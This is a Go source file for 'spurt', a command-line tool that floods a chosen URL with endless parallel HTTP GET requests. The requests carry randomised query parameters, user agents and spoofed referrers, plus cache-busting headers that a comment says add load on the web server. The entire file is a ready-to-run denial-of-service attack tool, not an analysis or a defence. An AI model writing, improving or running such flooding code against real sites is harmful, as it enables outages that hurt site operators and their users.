// spurt
package main

import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/buptmiao/parallel"
	"github.com/corpix/uarand"
)

var (
	version = "v1.7.5"

	banner = fmt.Sprintf(`
                          __
   _________  __  _______/ /_
  / ___/ __ \/ / / / ___/ __/
 (__  ) /_/ / /_/ / /  / /_
/____/ .___/\__,_/_/   \__/
    /_/                      ` + version)

	referrers = []string{
		"https://www.google.com/?q=",
		"https://www.facebook.com/",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.youtube.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
	}

	reset  = "\033[0m"
	red    = "\033[31m"
	green  = "\033[32m"
	blue   = "\033[34m"
	cyan   = "\033[36m"
	yellow = "\033[33m"
	clear  = "\033[2K\r"

	target          string
	paramJoiner     string
	reqCount        uint64
	threads         int
	checkIP         bool
	timeout         int
	timeoutDuration time.Duration
	sleep           int
	sleepDuration   time.Duration
	c               = &http.Client{
		Timeout: timeoutDuration,
	}
)

func colourise(colour, s string) string {
	return colour + s + reset
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func isValidURL(inputURL string) bool {
	// Check if the URL is in a valid format
	_, err := url.ParseRequestURI(inputURL)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return false
	}

	// Check if the URL has a scheme (http or https)
	u, err := url.Parse(inputURL)
	if err != nil || u.Scheme == "" {
		fmt.Println("Invalid URL scheme:", u.Scheme)
		return false
	}

	// Check if the URL scheme is either http or https
	if !strings.HasPrefix(u.Scheme, "http") {
		fmt.Println("Unsupported URL scheme:", u.Scheme)
		return false
	}

	// Additional check by making a request to the URL
	resp, err := http.Get(inputURL)
	if err != nil {
		fmt.Println("Error making request:", err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func fetchIP() {
	ip, err := http.Get("https://ipinfo.tw/")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer ip.Body.Close()
	body, err := io.ReadAll(ip.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("\n%s\n", body)
}

func get() {
	req, err := http.NewRequest("GET", target+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", uarand.GetRandom())
	req.Header.Add("Pragma", "no-cache")                  // Used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
	req.Header.Add("Cache-Control", "no-store, no-cache") // Creates more load on web server
	req.Header.Set("Referer", referrers[rand.Intn(len(referrers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)

	atomic.AddUint64(&reqCount, 1) // Increment number of requests sent

	// Check for timeout
	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
		fmt.Printf(colourise(red, clear+"Status: Timeout"))
	} else if err != nil {
		// Handle other types of errors
		fmt.Printf(colourise(red, clear+"Error sending request: %s"), err)
	} else {
		fmt.Printf(colourise(green, clear+"Status: OK"))
	}

	// Close response body if not nil
	if resp != nil {
		defer resp.Body.Close()
	}
}

func loop() {
	for {
		go get()
		time.Sleep(sleepDuration) // Sleep before sending request again
	}
}

func main() {
	fmt.Println(colourise(cyan, banner))
	fmt.Println(colourise(cyan, "\n\t\tgithub.com/zer-far\n"))

	flag.StringVar(&target, "url", "", "URL to target.")
	flag.IntVar(&timeout, "timeout", 3000, "Timeout in milliseconds.")
	flag.IntVar(&sleep, "sleep", 1, "Sleep time in milliseconds.")
	flag.IntVar(&threads, "threads", 1, "Number of threads.")
	flag.BoolVar(&checkIP, "check", false, "Enable IP address check.")
	flag.Parse()

	if checkIP {
		fetchIP()
	}

	if !isValidURL(target) {
		os.Exit(1)
	}
	if timeout == 0 {
		fmt.Println("Timeout must be greater than 0.")
		os.Exit(1)
	}
	if sleep <= 0 {
		fmt.Println("Sleep time must be greater than 0.")
		os.Exit(1)
	}
	if threads == 0 {
		fmt.Println("Number of threads must be greater than 0.")
		os.Exit(1)
	}

	// Convert values to milliseconds
	timeoutDuration = time.Duration(timeout) * time.Millisecond
	sleepDuration = time.Duration(sleep) * time.Millisecond

	if strings.ContainsRune(target, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	fmt.Printf(colourise(blue, "URL: %s\nTimeout (ms): %d\nSleep (ms): %d\nThreads: %d\n"), target, timeout, sleep, threads)

	fmt.Println(colourise(yellow, "Press control+c to stop"))
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		elapsed := time.Since(start).Seconds()
		// roundedElapsed := time.Duration(int64(elapsed*100)) * time.Millisecond
		rps := float64(reqCount) / elapsed
		fmt.Printf(colourise(blue, "\nTotal time (s): %.2f\nRequests: %d\nRequests per second: %.2f\n"), elapsed, reqCount, rps)

		os.Exit(0)
	}()

	p := parallel.NewParallel() // Runs function in parallel
	for i := 0; i < threads; i++ {
		p.Register(loop)
	}
	p.Run()
}
